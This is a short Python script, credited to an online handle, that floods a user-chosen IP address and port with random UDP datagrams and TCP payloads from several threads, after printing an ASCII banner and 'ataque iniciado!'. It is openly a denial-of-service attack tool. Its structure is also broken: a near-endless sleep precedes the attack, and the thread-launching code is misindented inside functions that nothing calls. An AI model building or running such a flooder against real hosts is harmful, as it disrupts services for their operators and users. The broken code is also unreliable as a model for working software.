#!/usr/bin/env python3
#Code by LeeOn123 bobozin DEU MELHORADA
import argparse
import random
import socket
import threading
import os
import time

ap = argparse.ArgumentParser()
ap.add_argument("-i", "--ip", required=True, type=str, help="Host ip")
ap.add_argument("-p", "--port", required=True, type=int, help="Port")
ap.add_argument("-c", "--choice", type=str, default="y", help="UDP(y/n)")
ap.add_argument("-t", "--times", type=int, default=50000, help="Packets per one connection")
ap.add_argument("-th", "--threads", type=int, default=5, help="Threads")
args = vars(ap.parse_args())

print("\033[91m000000000000000000000000000")
print("\033[91m000000000000000000000000000")
print("\033[91m000000000000000000000000000")
print("\033[91m000_________0000________000")
print("\033[91m000_________0000________000")
print("\033[91m000_________0000________000")
print("\033[91m000000000000000000000000000")
print("\033[91m000000000000000000000000000")
print("\033[91m000000000000000000000000000")
print("\033[91m000_____________________000")
print("\033[91m000_____________________000")
print("\033[91m000000000000000000000000000")
print("000000000000000000000000000")
print("\033[91m000000000000000000000000000")
time.sleep(1)
os.system("clear")
print("ataque iniciado!")
time.sleep(999999999)
ip = args['ip']
port = args['port']
choice = args['choice']
times = args['times']
threads = args['threads']

def run():
	data = random._urandom(1024)
	i = random.choice(("[!]","[!]","[!]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print("")
		except:
			print("")

def run2():
	data = random._urandom(16)
	i = random.choice(("[!]","[!]","[!]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print("")
		except:
			s.close()
			print("")

		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
		
def new():		
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()

		th = threading.Thread(target = new)
		th.start()
		th = threading.Thread(target = new)
		th.start()